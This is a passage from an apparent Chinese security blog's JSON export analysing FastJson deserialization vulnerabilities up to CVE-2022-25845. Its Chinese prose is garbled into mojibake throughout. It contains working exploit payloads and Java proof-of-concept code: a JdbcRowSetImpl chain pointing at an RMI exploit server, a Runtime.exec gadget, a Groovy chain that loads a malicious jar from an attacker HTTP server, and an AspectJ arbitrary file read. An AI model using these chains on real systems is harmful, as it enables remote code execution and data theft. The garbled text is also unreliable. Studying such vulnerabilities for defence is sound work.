ä¸­ï¼Œç„¶åä¼ å…¥ strVal ä¸­ã€‚\nåé¢çš„é€»è¾‘å¦‚æœ class æ˜¯ Class.class æ—¶ï¼Œå°†ä¼šè°ƒç”¨ loadClass æ–¹æ³•ï¼Œå°† strVal è¿›è¡Œç±»åŠ è½½å¹¶ç¼“å­˜ï¼š\nå°ç»“ é¦–å…ˆè¦é¿å¼€checkAutoType()ä¸­autoTypeSupport é»˜è®¤ä¸º false æ—¶çš„æ£€æŸ¥ï¼Œä»ä¸¤ä¸ªifåˆ¤æ–­è¯­å¥å…¥æ‰‹ å‘ç°åªæœ‰TypeUtils.getClassFromMapping(typeName)å¯èƒ½å¯¹clazzèµ‹å€¼ ä½¿ç”¨ä¸¤ä¸ªå‚æ•°çš„loadclasså‘mappingä¸­èµ‹å€¼ MiscCodec#deserialze æ–¹æ³•è°ƒç”¨äº†ä¸¤ä¸ªå‚æ•°çš„loadclass è°ƒç”¨ä¹‹å‰éœ€è¦æ»¡è¶³parser.resolveStatus ä¸ºTypeNameRedirectï¼ˆå€¼ä¸º2ï¼‰ æ—¶ï¼Œå…¶ä¸­ä¸€ä¸ªkeyä¸º val ï¼Œæ­¤æ—¶ä¼šå°†valçš„å†…å®¹æ”¾å…¥ objVal ä¸­ï¼Œç„¶åä¼ å…¥ strVal ä¸­ã€‚ æ¥ç€å¦‚æœ class æ˜¯ Class.class æ—¶ï¼Œå°†ä¼šè°ƒç”¨ loadClass æ–¹æ³•ï¼Œå°† strVal è¿›è¡Œç±»åŠ è½½å¹¶ç¼“å­˜\næ‰€ä»¥å¯ä»¥å°†æ¶æ„ç±»åå­˜åˆ°valä¸­ï¼Œè¿™å°±å®Œæˆäº†æ¶æ„ç±»çš„åŠ è½½ï¼Œå¯ä»¥é¿å¼€å¼‚å¸¸çš„æŠ›å‡ºã€‚ å¦‚ä½•æ»¡è¶³parser.resolveStatus ä¸ºTypeNameRedirectï¼ˆå€¼ä¸º2ï¼‰ï¼Œåœ¨åé¢è°ƒè¯•ä¸­ä¼šè®²åˆ°\nè°ƒè¯• æˆ‘ä»¬å…ˆæ„é€ ä¸€ä¸ª json ï¼š{\u0026quot;@type\u0026quot;:\u0026quot;java.lang.Class\u0026quot;,\u0026quot;val\u0026quot;:\u0026quot;reus09\u0026quot;} ï¼Œè°ƒè¯•ä¸€ä¸‹ï¼š\nJSON.parseObject() è°ƒç”¨ DefaultJSONParser å¯¹ JSON è¿›è¡Œè§£æã€‚\nDefaultJSONParser.parseObject()è°ƒç”¨checkAutoType()` æ£€æŸ¥å¾…åŠ è½½ç±»çš„åˆæ³•æ€§ã€‚\nç”±äº deserializers åœ¨åˆå§‹åŒ–æ—¶å°† Class.class è¿›è¡Œäº†åŠ è½½ï¼Œå› æ­¤ä½¿ç”¨ findClass å¯ä»¥æ‰¾åˆ°ï¼Œè¶Šè¿‡äº†åé¢ AutoTypeSupport çš„æ£€æŸ¥ã€‚\nDefaultJSONParser.parseObject() è®¾ç½® resolveStatus ä¸º 2ã€‚ DefaultJSONParser.parseObject() æ ¹æ®ä¸åŒçš„ class ç±»å‹åˆ†é… deserialzerï¼ŒClass ç±»å‹ç”± MiscCodec.deserialze() å¤„ç†ã€‚\nè§£æ json ä¸­ â€œvalâ€ ä¸­çš„å†…å®¹ï¼Œå¹¶æ”¾å…¥ objVal ä¸­ï¼Œå¦‚æœä¸æ˜¯ \u0026ldquo;val\u0026rdquo; å°†ä¼šæŠ¥é”™ã€‚\nä¼ é€’è‡³ strVal å¹¶ä½¿ç”¨ loadClass åŠ è½½å¹¶ç¼“å­˜ã€‚\næ­¤æ—¶æ¶æ„çš„ val æˆåŠŸè¢«æˆ‘ä»¬åŠ è½½åˆ° mappings ä¸­ï¼Œå†æ¬¡ä»¥æ¶æ„ç±»è¿›è¡Œ @type è¯·æ±‚æ—¶å³å¯ç»•è¿‡é»‘åå•è¿›è¡Œçš„é˜»æ‹¦ï¼Œå› æ­¤æœ€ç»ˆ payload ä¸ºï¼š\n1 2 3 4 5 6 7 8 9 10 11 { \u0026#34;reus09\u0026#34;: { \u0026#34;@type\u0026#34;: \u0026#34;java.lang.Class\u0026#34;, \u0026#34;val\u0026#34;: \u0026#34;com.sun.rowset.JdbcRowSetImpl\u0026#34; }, \u0026#34;reus09\u0026#34;: { \u0026#34;@type\u0026#34;: \u0026#34;com.sun.rowset.JdbcRowSetImpl\u0026#34;, \u0026#34;dataSourceName\u0026#34;: \u0026#34;rmi://127.0.0.1:1099/Exploit\u0026#34;, \u0026#34;autoCommit\u0026#34;: true } } fastjson-1.2.68 åœ¨ 1.2.47 ç‰ˆæœ¬æ¼æ´çˆ†å‘ä¹‹åï¼Œå®˜æ–¹åœ¨ 1.2.48 å¯¹æ¼æ´è¿›è¡Œäº†ä¿®å¤ï¼Œåœ¨ MiscCodec å¤„ç† Class ç±»çš„åœ°æ–¹ï¼Œè®¾ç½®äº†cache ä¸º false ï¼Œå¹¶ä¸” loadClass é‡è½½æ–¹æ³•çš„é»˜è®¤çš„è°ƒç”¨æ”¹ä¸ºä¸ç¼“å­˜ï¼Œè¿™å°±é¿å…äº†ä½¿ç”¨äº† Class æå‰å°†æ¶æ„ç±»åç¼“å­˜è¿›å»ã€‚\nè¿™ä¸ªå®‰å…¨ä¿®å¤ä¸º fastjson å¸¦æ¥äº†ä¸€å®šæ—¶é—´çš„å¹³é™ï¼Œç›´åˆ° 1.2.68 ç‰ˆæœ¬å‡ºç°äº†æ–°çš„æ¼æ´åˆ©ç”¨æ–¹å¼ã€‚\nå½±å“ç‰ˆæœ¬ï¼šfastjson \u0026lt;= 1.2.68 æè¿°ï¼šåˆ©ç”¨ expectClass ç»•è¿‡ checkAutoType() ï¼Œå®é™…ä¸Šä¹Ÿæ˜¯ä¸ºäº†ç»•è¿‡å®‰å…¨æ£€æŸ¥çš„æ€è·¯çš„å»¶ä¼¸ã€‚ä¸»è¦ä½¿ç”¨ Throwable å’Œ AutoCloseable è¿›è¡Œç»•è¿‡ã€‚\nç‰ˆæœ¬ 1.2.68 æœ¬èº«æ›´æ–°äº†ä¸€ä¸ªæ–°çš„å®‰å…¨æ§åˆ¶ç‚¹ safeModeï¼Œå¦‚æœåº”ç”¨ç¨‹åºå¼€å¯äº† safeModeï¼Œå°†åœ¨ checkAutoType() ä¸­ç›´æ¥æŠ›å‡ºå¼‚å¸¸ï¼Œä¹Ÿå°±æ˜¯å®Œå…¨ç¦æ­¢ autoTypeï¼Œä¸å¾—ä¸è¯´ï¼Œè¿™æ˜¯ä¸€ä¸ªä¸€åŠ³æ°¸é€¸çš„ä¿®å¤æ–¹å¼ã€‚\nä½†ä¸æ­¤åŒæ—¶ï¼Œè¿™ä¸ªç‰ˆæœ¬æŠ¥å‡ºäº†ä¸€ä¸ªæ–°çš„ autoType å¼€å…³ç»•è¿‡æ–¹å¼ï¼šåˆ©ç”¨ expectClass ç»•è¿‡ checkAutoType()ã€‚\nåœ¨ checkAutoType() å‡½æ•°ä¸­æœ‰è¿™æ ·çš„é€»è¾‘ï¼šå¦‚æœå‡½æ•°æœ‰ expectClass å…¥å‚ï¼Œä¸”æˆ‘ä»¬ä¼ å…¥çš„ç±»åæ˜¯ expectClass çš„å­ç±»æˆ–å®ç°ï¼Œå¹¶ä¸”ä¸åœ¨é»‘åå•ä¸­ï¼Œå°±å¯ä»¥é€šè¿‡ checkAutoType() çš„å®‰å…¨æ£€æµ‹ã€‚(isAssignableFrom(clazz) åˆ¤å®šæ­¤ Class å¯¹è±¡æ‰€è¡¨ç¤ºçš„ç±»æˆ–æ¥å£ä¸æŒ‡å®šçš„ Class å‚æ•°æ‰€è¡¨ç¤ºçš„ç±»æˆ–æ¥å£æ˜¯å¦ç›¸åŒï¼Œæˆ–æ˜¯å¦æ˜¯å…¶è¶…ç±»æˆ–è¶…æ¥å£)ã€‚\næ¥ä¸‹æ¥æˆ‘ä»¬æ‰¾ä¸€ä¸‹ checkAutoType() å‡ ä¸ªé‡è½½æ–¹æ³•æ˜¯å¦æœ‰å¯æ§çš„ expectClass çš„å…¥å‚æ–¹å¼ï¼Œæœ€ç»ˆæ‰¾åˆ°äº†ä»¥ä¸‹å‡ ä¸ªç±»ï¼š\nThrowableDeserializer#deserialze() JavaBeanDeserializer#deserialze() ThrowableDeserializer#deserialze() æ–¹æ³•ç›´æ¥å°† @type åçš„ç±»ä¼ å…¥ checkAutoType() ï¼Œå¹¶ä¸” expectClass ä¸º Throwable.classã€‚\né€šè¿‡ checkAutoType() ä¹‹åï¼Œå°†ä½¿ç”¨ createException æ¥åˆ›å»ºå¼‚å¸¸ç±»çš„å®ä¾‹ã€‚\nè¿™å°±å½¢æˆäº† Throwable å­ç±»ç»•è¿‡ checkAutoType() çš„æ–¹å¼ã€‚æˆ‘ä»¬éœ€è¦æ‰¾åˆ° Throwable çš„å­ç±»ï¼Œè¿™ä¸ªç±»çš„ getter/setter/static block/constructor ä¸­å«æœ‰å…·æœ‰å¨èƒçš„ä»£ç é€»è¾‘ã€‚\nä¸ Throwable ç±»ä¼¼åœ°ï¼Œè¿˜æœ‰ AutoCloseable ï¼Œä¹‹æ‰€ä»¥ä½¿ç”¨ AutoCloseable ä»¥åŠå…¶å­ç±»å¯ä»¥ç»•è¿‡ checkAutoType() ï¼Œæ˜¯å› ä¸º AutoCloseable æ˜¯å±äº fastjson å†…ç½®çš„ç™½åå•ä¸­ï¼Œå…¶ä½™çš„è°ƒç”¨é“¾ä¸€è‡´ï¼Œæµç¨‹ä¸å†èµ˜è¿°ã€‚\nfastjson-1.2.80 è§ä¹‹å‰æ–‡ç« ã€‚\næ€»ç»“ ç»è¿‡ä¸Šé¢çš„åˆ†æï¼Œæˆ‘ä»¬ç›´åˆ°å¦‚æœæƒ³è¦é€šè¿‡checkAutoTypeçš„æ£€éªŒï¼Œæœ‰ä»¥ä¸‹å‡ ç§æ–¹æ³•:\nä¼ å…¥çš„ç±»åœ¨ç™½åå•ä¸­ å¼€å¯äº†autotype(autoTypeSupport is true) ä½¿ç”¨äº†JSONTypeæ³¨è§£(å¦‚:fastjson.annotation.JSONType) æŸäº›æœŸæœ›ç±» (ç»§æ‰¿äºexpectClass) è¦ååºåˆ—åŒ–çš„ç±»åœ¨cacheä¸­ (TypeUtils.mappingsåˆ—è¡¨ä¸­æœ‰ @type æŒ‡å®šçš„ç±») ä½†å…·ä½“å¯ä»¥æ“ä½œçš„è·¯çº¿ã€æ”»å‡»é“¾æ„Ÿè§‰è¿˜æ˜¯è¦å¯¹ä»£ç æœ‰è¶³å¤Ÿçš„ç†Ÿç»ƒæŒæ¡ã€‚\næ€»çš„æ¥è¯´ï¼Œæ„Ÿè§‰fastjsonæ¼æ´çš„åˆ©ç”¨å¤§éƒ¨åˆ†éƒ½æ˜¯ä¸€äº›é€»è¾‘ä¸Šçš„ä»£ç é—®é¢˜ï¼ŒåŒæ—¶ä¹Ÿæ˜¯é»‘å®¢å·§å¦™çš„æ”»å‡»é“¾æ„é€ ã€‚\næœ€åï¼Œå­¦ä¹ åˆ°äº†ä¸€äº›FastJsonååºåˆ—åŒ–çš„åŸºæœ¬åŸç†ï¼Œä¹‹å‰éƒ½æ˜¯äº‘é‡Œé›¾é‡Œï¼Œä¸çŸ¥å…¶æ‰€ä»¥ç„¶ã€‚æ­¤å¤–ï¼Œå¯¹FastJsonçš„parseã€parseObjectç›¸å…³æ–¹æ³•çš„åŒºåˆ«ã€‚è¿˜æœ‰å°±æ˜¯å‘ç°ç°åœ¨å†™åšå®¢å¾€å¾€éƒ½æ˜¯å¯¹åˆ«äººçš„æ–‡ç« å¤§æŠ„ç‰¹æŠ„ï¼Œè‡ªå·±çš„ä¸œè¥¿ã€æ€è€ƒå¤ªå°‘äº†ï¼Œä¸ºä»€ä¹ˆè¦è¿™æ ·å†™?ä¸ºä»€ä¹ˆè¿™ä¹ˆæ€è€ƒ?ä»¥åè¿˜æ˜¯éœ€è¦åŠªåŠ›ã€‚\nReference https://su18.org/post/fastjson/#1-fastjson-1224 http://blog.topsec.com.cn/fastjson-1-2-24%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%e6%bc%8f%e6%b4%9e%e6%b7%b1%e5%ba%a6%e5%88%86%e6%9e%90/ https://www.yang99.top/index.php/archives/71/ https://paper.seebug.org/1192/#comsunrowsetjdbcrowsetimpl https://juejin.cn/post/6846687594130964488#heading-3 https://blog.csdn.net/hosaos/article/details/106982555 ","permalink":"http://www.reus09.top/posts/tech/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/","summary":"å®é™…ä¸Šï¼Œå‰ä¸ä¹…åˆšåˆšåˆ†æäº†FastJson1.2.80æ¼æ´ï¼Œä¸€æ–¹é¢å¯¹Javaååºåˆ—åŒ–æ¼æ´æœ‰äº†ä¸€ä¸ªåˆæ­¥çš„äº†è§£ï¼Œå¦‚æœå¯ä»¥æ§åˆ¶ä¸€ä¸ªç±»çš„å®ä¾‹åŒ–ï¼Œå¹¶ä¸”è¿™","title":"FastJsonååºåˆ—åŒ–æ¼æ´æ€»ç»“"},{"content":"å®é™…ä¸Šä¿ç ”åã€åä¸€å‡æœŸä¹‹åï¼Œä¸€ç›´åœ¨æ‘†çƒ‚ã€èººå¹³(å……åˆ†æ„Ÿå—åˆ°ç ”ç©¶ç”Ÿæ‰“å·¥ä»”çš„å‘½è¿)ï¼Œè¿™ç¯‡æ–‡ç« ä¸»è¦æ˜¯æƒ³åˆ†æä¸€ä¸‹FastJsonæœ€æ–°çˆ†å‡ºæ¥çš„æ¼æ´CVE-2022-25845ï¼Œå­¦åˆ°äº†AutoTypeCheckæ˜¯å¦‚ä½•ä½œç”¨çš„ã€‚å®é™…ä¸Šå¥½å¤šå¤§å¸ˆå‚…å·²ç»åˆ†æçš„å¾ˆæ˜ç™½äº†ï¼Œæˆ‘ä¹Ÿåªæ˜¯å€Ÿç€å¤§å¸ˆå‚…çš„ç¬”è®°æ‰‹åŠ¨å¤ç°ä¸€ä¸‹ï¼Œä¹‹åä¼šå¯¹FastJsonç³»åˆ—æ¼æ´åšä¸€ä¸ªç³»ç»Ÿçš„æ•´ç†ã€‚\n0x01 æ¼æ´ä»‹ç» Fastjson ä»£ç æ‰§è¡Œæ¼æ´ï¼Œè¯¥æ¼æ´å…è®¸æ”»å‡»è€…ç»•è¿‡ Fastjson ä¸­çš„\u0026quot;AutoTypeCheck\u0026quot;æœºåˆ¶å¹¶å®ç°è¿œç¨‹ä»£ç æ‰§è¡Œ\nå½±å“ç‰ˆæœ¬ï¼š1.2.80åŠä»¥ä¸‹ç‰ˆæœ¬ï¼Œå³\u0026lt;= 1.2.80\næ‰€æœ‰ä¾èµ– Fastjson ç‰ˆæœ¬ 1.2.80 æˆ–æ›´æ—©ç‰ˆæœ¬çš„ç¨‹åºï¼Œåœ¨åº”ç”¨ç¨‹åºä¸­å¦‚æœåŒ…å«ä½¿ç”¨ç”¨æˆ·æ•°æ®è°ƒç”¨ JSON.parse æˆ– JSON.parseObject æ–¹æ³•ï¼Œä½†ä¸æŒ‡å®šè¦ååºåˆ—åŒ–çš„ç‰¹å®šç±»ï¼Œéƒ½ä¼šå—æ­¤æ¼æ´çš„å½±å“ã€‚\nåœ¨è¿™äº›å‰ææ¡ä»¶ä¸‹ï¼Œæ”»å‡»è€…ä¹Ÿåªèƒ½é€šè¿‡è¿™ä¸ªæ¼æ´è°ƒç”¨ç‰¹å®šç±»å‹çš„Javaååºåˆ—åŒ–gadgetï¼ˆç»§æ‰¿Throwableç±»çš„gadgetç±»ï¼‰ï¼Œè¿™å¤§å¤§é™åˆ¶äº†è¿™ä¸ªæ¼æ´çš„å®é™…å½±å“ã€‚\næœŸæœ›ç±»ä¸ç±»ç¼“å­˜ Fastjsonååºåˆ—åŒ–æ¢å¤ç±»å®ä¾‹æ—¶ï¼Œè‡ªç„¶ä¹Ÿéœ€è¦æ¢å¤ç”¨åˆ°äº†çš„ç±»å±æ€§ã€‚å¦‚æœè¿™ä¸ªå±æ€§æ˜¯å¯åˆ©ç”¨çš„ç±»ä¸”æˆ‘ä»¬å¯æ§ï¼Œæ˜¯ä¸æ˜¯å°±èƒ½ç›´æ¥åˆ©ç”¨ æˆ–è€…è¿›ä¸€æ­¥æ¨ªå‘æ‰©å±•å‡ºå…¶å®ƒç±»é—´æ¥åˆ©ç”¨ã€‚ä¸Šä¸€ç¯‡æˆ‘ä»¬è¯´åˆ°äº†æœŸæœ›ç±»ä¸ä½†å¯ä»¥ç”±JSONæ˜¾å¼æŒ‡å®šï¼ŒåŒæ ·å¯ä»¥ç”±ç±»é—´å…³ç³»éšå¼ç¡®å®šï¼Œé‚£ä¹ˆä¾é å±æ€§åèµ‹å€¼æ—¶çš„éšå¼ç±»é—´å…³ç³»ï¼Œä¹Ÿå°±ä¸å†éœ€è¦åœ¨JSONä¸­æ˜¾å¼æŒ‡å®š@typeï¼Œä»è€Œç»•è¿‡äº†autoTypeçš„ç™½åå•æ£€æŸ¥ã€‚\nå®ä¾‹åŒ–ç±»å±æ€§çš„å¯¹åº”ç±»åï¼Œfastjsonä¼šå°†å…¶åŠ å…¥åˆ°ç±»ç¼“å­˜mappingsä¸­ï¼Œä»ç¼“å­˜ä¸­å–ç±»åœ¨ä¿®å¤å‰ä¸ä¼šåˆ¤æ–­autoTypeSupportï¼Œæ‰€ä»¥ç»•è¿‡äº†ç±»ç™½åå•æœºåˆ¶æ‰©å±•å‡ºæ›´å¤šçš„å¯ç”¨ç±»ã€‚\n0x02 æ¼æ´ç¯å¢ƒæ­å»º ç¯å¢ƒä¾èµ–å¯¼å…¥ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.alibaba\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;fastjson\u0026lt;/artifactId\u0026gt; \u0026lt;!-- \u0026lt;version\u0026gt;1.2.24\u0026lt;/version\u0026gt;--\u0026gt; \u0026lt;!-- \u0026lt;version\u0026gt;1.2.41\u0026lt;/version\u0026gt;--\u0026gt; \u0026lt;!-- \u0026lt;version\u0026gt;1.2.42\u0026lt;/version\u0026gt;--\u0026gt; \u0026lt;!-- \u0026lt;version\u0026gt;1.2.43\u0026lt;/version\u0026gt;--\u0026gt; \u0026lt;!-- \u0026lt;version\u0026gt;1.2.44\u0026lt;/version\u0026gt;--\u0026gt; \u0026lt;!-- \u0026lt;version\u0026gt;1.2.47\u0026lt;/version\u0026gt;--\u0026gt; \u0026lt;!-- \u0026lt;version\u0026gt;1.2.68\u0026lt;/version\u0026gt;--\u0026gt; \u0026lt;version\u0026gt;1.2.80\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;!-- æ–‡ä»¶è¯»å–åŒ… --\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.aspectj\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;aspectjtools\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;1.9.7\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;!-- groovy-all åˆ©ç”¨é“¾ --\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.codehaus.groovy\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;groovy-all\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;3.0.12\u0026lt;/version\u0026gt; \u0026lt;type\u0026gt;pom\u0026lt;/type\u0026gt; \u0026lt;/dependency\u0026gt; YoungBearæä¾›çš„æ–¹æ¡ˆ YoungBearæä¾›çš„æ¼æ´POCä»£ç å¦‚ä¸‹ï¼š\npocç±»ï¼šå¿…é¡»ç»§æ‰¿Exceptionç±»æˆ–è€…Error\n1 2 3 4 5 6 7 8 9 10 11 import java.io.IOException; public class PocThrow extends Exception{ public void setName(String str) { try { Runtime.getRuntime().exec(str); } catch (IOException e) { e.printStackTrace(); } } } æ”»å‡»ä»£ç :\n1 2 3 4 5 public static void main(String[] args) { String json = \u0026#34;{\\\u0026#34;@type\\\u0026#34;:\\\u0026#34;java.lang.Exception\\\u0026#34;,\\\u0026#34;@type\\\u0026#34;:\\\u0026#34;PocThrow\\\u0026#34;,\\\u0026#34;name\\\u0026#34;:\\\u0026#34;open /System/Applications/Calculator.app\\\u0026#34;}\u0026#34;; JSON.parse(json); } ä¸»è¦é€šè¿‡æ„é€ jsonä¸²ï¼Œå®ç°ç»•è¿‡Auto-type\n1 2 3 4 5 { \u0026#34;@type\u0026#34;: \u0026#34;java.lang.Exception\u0026#34;, \u0026#34;@type\u0026#34;: \u0026#34;PocThrow\u0026#34;, \u0026#34;name\u0026#34;: \u0026#34;calc\u0026#34; } groovyé“¾ æµ…è“å¸ˆå‚…ç»™å‡ºçš„æ”»å‡»é“¾ï¼š\næ”»å‡»åˆ©ç”¨éœ€è¦ç”¨åˆ°classpathListéœ€è¦å…ˆæ­å»ºä¸€ä¸ªæ¶æ„çš„æ”»å‡»æœåŠ¡å™¨ï¼Œé‡Œé¢å­˜åœ¨æˆ‘ä»¬çš„æ¶æ„jaråŒ…\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 package groovy.grape; import org.codehaus.groovy.ast.ASTNode; import org.codehaus.groovy.control.CompilePhase; import org.codehaus.groovy.control.SourceUnit; import org.codehaus.groovy.transform.ASTTransformation; import org.codehaus.groovy.transform.GroovyASTTransformation; import java.io.IOException; @GroovyASTTransformation(phase= CompilePhase.CONVERSION) public class GrabAnnotationTransformation2 implements ASTTransformation { public GrabAnnotationTransformation2() { try { Runtime.getRuntime().exec(\u0026#34;open /System/Applications/Calculator.app\u0026#34;); } catch (IOException e) { } } @Override public void visit(ASTNode[] nodes, SourceUnit source) { } } ç„¶åRCEåˆ©ç”¨pocä»£ç ,å®ç°å¼¹è®¡ç®—å™¨\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 import com.alibaba.fastjson.JSON; import java.io.IOException; /** * @ClassName groovy * @Description TODO * @Author reus09 * @Date 2022/10/8 16:50 * @Version 1.0 **/ public class groovy { private static String poc1 = \u0026#34;{\\n\u0026#34; + \u0026#34; \\\u0026#34;@type\\\u0026#34;:\\\u0026#34;java.lang.Exception\\\u0026#34;,\\n\u0026#34; + \u0026#34; \\\u0026#34;@type\\\u0026#34;:\\\u0026#34;org.codehaus.groovy.control.CompilationFailedException\\\u0026#34;,\\n\u0026#34; + \u0026#34; \\\u0026#34;unit\\\u0026#34;:{}\\n\u0026#34; + \u0026#34;}\u0026#34;; private static String poc2 = \u0026#34;{\\n\u0026#34; + \u0026#34; \\\u0026#34;@type\\\u0026#34;:\\\u0026#34;org.codehaus.groovy.control.ProcessingUnit\\\u0026#34;,\\n\u0026#34; + \u0026#34; \\\u0026#34;@type\\\u0026#34;:\\\u0026#34;org.codehaus.groovy.tools.javac.JavaStubCompilationUnit\\\u0026#34;,\\n\u0026#34; + \u0026#34; \\\u0026#34;config\\\u0026#34;:{\\n\u0026#34; + \u0026#34; \\\u0026#34;@type\\\u0026#34;:\\\u0026#34;org.codehaus.groovy.control.CompilerConfiguration\\\u0026#34;,\\n\u0026#34; + \u0026#34; \\\u0026#34;classpathList\\\u0026#34;:\\\u0026#34;http://127.0.0.1:8000/attack-1.jar\\\u0026#34;\\n\u0026#34; + \u0026#34; }\\n\u0026#34; + \u0026#34;}\u0026#34;; public static void main(String[] args) throws IOException { try { JSON.parseObject(poc1); } catch (Exception e){} JSON.parseObject(poc2); } } aspectjè¯»å–æ–‡ä»¶ è¯»å–æ–‡ä»¶åˆ©ç”¨ä»£ç \nè¯»å–/Users/reus09/flag.txtæ–‡ä»¶ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 import com.alibaba.fastjson.JSON; public class aspectj { private static String poc1 = \u0026#34;{\\n\u0026#34; + \u0026#34; \\\u0026#34;@type\\\u0026#34;:\\\u0026#34;java.lang.Exception\\\u0026#34;,\\n\u0026#34; + \u0026#34; \\\u0026#34;@type\\\u0026#34;:\\\u0026#34;org.aspectj.org.eclipse.jdt.internal.compiler.lookup.SourceTypeCollisionException\\\u0026#34;\\n\u0026#34; + \u0026#34;}\u0026#34;; private static String poc2 = \u0026#34;{\\n\u0026#34; + \u0026#34; \\\u0026#34;@type\\\u0026#34;:\\\u0026#34;java.lang.Class\\\u0026#34;,\\n\u0026#34; + \u0026#34; \\\u0026#34;val\\\u0026#34;:{\\n\u0026#34; + \u0026#34; \\\u0026#34;@type\\\u0026#34;:\\\u0026#34;java.lang.String\\\u0026#34;{\\n\u0026#34; + \u0026#34; \\\u0026#34;@type\\\u0026#34;:\\\u0026#34;java.util.Locale\\\u0026#34;,\\n\u0026#34; + \u0026#34; \\\u0026#34;val\\\u0026#34;:{\\n\u0026#34; + \u0026#34; \\\u0026#34;@type\\\u0026#34;:\\\u0026#34;com.alibaba.fastjson.JSONObject\\\u0026#34;,{\\n\u0026#34; + \u0026#34; \\\u0026#34;@type\\\u0026#34;:\\\u0026#34;java.lang.String\\\u0026#34;\\n\u0026#34; + \u0026#34; \\\u0026#34;@type\\\u0026#34;:\\\u0026#34;org.aspectj.org.eclipse.jdt.internal.compiler.lookup.SourceTypeCollisionException\\\u0026#34;,\\n\u0026#34; + \u0026#34; \\\u0026#34;newAnnotationProcessorUnits\\\u0026#34;:[{}]\\n\u0026#34; + \u0026#34; }\\n\u0026#34; + \u0026#34; }\\n\u0026#34; + \u0026#34; }\u0026#34;; private static String poc3 = \u0026#34;{\\n\u0026#34; + \u0026#34; \\\u0026#34;x\\\u0026#34;:{\\n\u0026#34; + \u0026#34; \\\u0026#34;@type\\\u0026#34;:\\\u0026#34;org.aspectj.org.eclipse.jdt.internal.compiler.env.ICompilationUnit\\\u0026#34;,\\n\u0026#34; + \u0026#34; \\\u0026#34;@type\\\u0026#34;:\\\u0026#34;org.aspectj.org.eclipse.jdt.internal.core.BasicCompilationUnit\\\u0026#34;,\\n\u0026#34; + \u0026#34; \\\u0026#34;fileName\\\u0026#34;:\\\u0026#34;/Users/reus09/flag.txt\\\u0026#34;\\n\u0026#34; + \u0026#34; }\\n\u0026#34; + \u0026#34;}\u0026#34;; public static void main(String[] args) { JSON.parseObject(poc1); try { JSON.parseObject(poc2); } catch (Exception e){} System.out.println(JSON.parseObject(poc3)); } } 0x03 æ¼æ´å¤ç° åŸºç¡€POC å¯ä»¥å®ç°ç›´æ¥å¼¹è®¡ç®—å™¨\ngroovyé“¾åˆ©ç”¨ å°†æˆ‘ä»¬éœ€è¦è¿œç¨‹åŠ å…¥classpathListçš„æ¶æ„ä»£ç æ‰“åŒ…ä¸ºjaråŒ…ï¼Œç„¶åä½¿ç”¨pythonåœ¨å½“å‰ç›®å½•å¼€å¯ä¸€ä¸ªç®€æ˜“çš„httpæœåŠ¡å™¨:\npython -m http.server 8000:\nç„¶åè¿è¡Œgroovyçš„åˆ©ç”¨ä»£ç \naspectjé“¾åˆ©ç”¨ åœ¨/Users/reus09/ç›®å½•ä¸‹å†™æ–‡ä»¶flag.txt\nè¿è¡Œpocè·å–ç›®æ ‡æ–‡ä»¶çš„å†…å®¹\n0x04 æ¼æ´åŸç†åˆ†æ fastjson 1.2.25 åè®¾å®šäº† autoType ã€‚åªæœ‰æ‰“å¼€ autoTypeä¹‹åï¼Œfastjson æ˜¯åŸºäºå†…ç½®é»‘åå•æ¥å®ç°å®‰å…¨çš„ï¼Œå¦‚æ­¤å¯èƒ½ä¼šé€ æˆå®‰å…¨é£é™©ï¼Œå°±æ˜¯ç»•è¿‡é»‘åå•ã€‚å…³é—­æ—¶ï¼Œæ˜¯åŸºäºç™½åå•è¿›è¡Œé˜²æŠ¤çš„ï¼Œè¿™ä¸ªæ¼æ´çš„äº§ç”Ÿå°±æ˜¯æœªå¼€å¯ autoType æ—¶äº§ç”Ÿçš„ã€‚\nä½†æ˜¯å…³é—­ autoType æ—¶æ˜¯åŸºäºç™½åå•ï¼Œæ˜¯å¾ˆéš¾å®ç°ä»£ç æ‰§è¡Œçš„ï¼Œæ‰€ä»¥æˆ‘ä»¬å°±éœ€è¦æƒ³åŠæ³• Bypass AutoType é»˜è®¤ç¦ç”¨ç­–ç•¥ï¼Œå¯ä»¥å®ç°è°ƒç”¨ä»»æ„ç±»ã€‚\nå½“JSON.parseObject()è¢«è°ƒç”¨æ—¶ï¼Œå®ƒæœ€ç»ˆä¼šè°ƒç”¨åˆ° DefaultJSONParser.parseObject()ï¼Œå¹¶ä¸”ä¼ å…¥å‚æ•°object ä¸º JSONObjectï¼ŒfieldName ä¸º nullã€‚å½“è¿™ä¸ªæ–¹æ³•é‡åˆ°â€œ@typeâ€è¿™ä¸ªç¬¦å·ï¼ˆJSON.DEFAULT_TYPE_KEYï¼‰æ—¶ï¼Œå°±ä¼šè°ƒç”¨config.checkAutoTypeï¼š\nä»£ç ä¼šè°ƒç”¨è‡³config.checkAutoType()ã€‚åœ¨è¿™é‡Œï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°å› ä¸ºè¢«åˆ—å…¥é»‘åå•è€Œæ— æ³•é€šè¿‡AutoType æœºåˆ¶å®ä¾‹åŒ–çš„ç±»åˆ—è¡¨ã€‚\nè¿™äº›è¢«Bançš„ç±»æ˜¯ä»¥ä¸‹è¿™äº›ï¼š\njava.lang.Object java.io.Serializable java.lang.Cloneable 